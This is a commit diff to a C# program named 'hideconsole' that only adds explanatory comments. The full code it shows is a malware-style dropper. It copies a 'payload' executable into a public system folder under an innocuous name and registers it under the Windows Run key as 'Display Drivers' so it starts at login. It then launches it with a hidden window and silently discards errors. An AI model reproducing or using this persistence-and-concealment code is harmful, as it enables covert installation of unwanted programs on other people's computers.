890fc722954b25c3fe86fb5ae5fdaa53207fbd9d
syed7 <shasnain@hawk.iit.edu>
2016-02-21 00:52:18 -0600

    Update Program.cs

--- hideconsole/Program.cs
+++ hideconsole/Program.cs
@@ -16,28 +16,25 @@ namespace hideconsole
             try
             {
                 string targetPath = @"C:\Users\Public\System\";                
-                
                 if (!System.IO.Directory.Exists(targetPath))
                 {
                     System.IO.Directory.CreateDirectory(targetPath);
                 }
-                File.Copy("your-file-name.exe", targetPath + "some-authentic-name.exe", true);
-                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                key.SetValue("Display Drivers", targetPath + @"DisplayDriver.exe");
+                File.Copy("your-file-name.exe", targetPath + "some-authentic-name.exe", true); // Copies another executable/payload to system directory
+                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);//adds executable file to registery to ensure execution at windows start up
+                key.SetValue("Display Drivers", targetPath + @"DisplayDriver.exe"); //registery is created with this value
                 Process proc = new Process();
                 proc.StartInfo.FileName = Path.Combine(targetPath + "DisplayDriver.exe"); 
-                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // hides application 
                 proc.StartInfo.CreateNoWindow = true;
                 proc.StartInfo.RedirectStandardOutput = true;
                 proc.StartInfo.UseShellExecute = false;
                 proc.Start();    
-
             }
             catch (Exception ex)
             {
                 //Console.WriteLine(ex.ToString());
             }
-
             //Console.ReadKey();
 
         }
